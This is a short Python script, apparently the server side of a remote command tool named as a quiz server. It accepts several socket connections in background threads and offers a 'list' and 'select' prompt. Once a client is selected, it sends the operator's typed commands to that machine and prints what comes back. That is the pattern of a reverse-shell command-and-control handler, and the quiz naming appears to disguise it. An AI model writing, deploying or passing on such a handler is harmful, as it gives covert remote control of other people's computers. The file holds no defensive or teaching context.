import sys
import threading
import time
from queue import Queue
import quiz_socket as qsocket

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
connections = []
address = []

def create_workers(quizServer):
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(quizServer,))
        t.daemon = True
        t.start()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

def work(quizServer):
    while True:
        x = queue.get()
        if x == 1:
            quizServer.bind()
            quizServer.init_connections()
        if x == 2:
            start_turtle(quizServer)
        queue.task_done()

def start_turtle(quizServer):
    while True:
        cmd = input('command> ')
        if cmd == 'list':
            quizServer.show_connections()
        elif 'select' in cmd:
            conn = try_connect_cliente(quizServer, cmd)
            if conn is not None:
                send_client_commands(conn)
        else:
            print("Comando nao mapeado")

def try_connect_cliente(quizServer, cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        
        conn = quizServer.get_connected_client_by_id(target)
        addrs = quizServer.get_address()[target][0]
        
        print("Conectado ao cliente: " + str(addrs))
        print(str(addrs) + ">", end="")

        return conn
    except:
        print("Error ao conectar com o cliente informado.")
        return None

def send_client_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'exit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error ao enviar comandos para o cliente")
            break

if __name__ == "__main__":
    quizServer = qsocket.SocketQuiz()
    create_workers(quizServer)
    create_jobs()
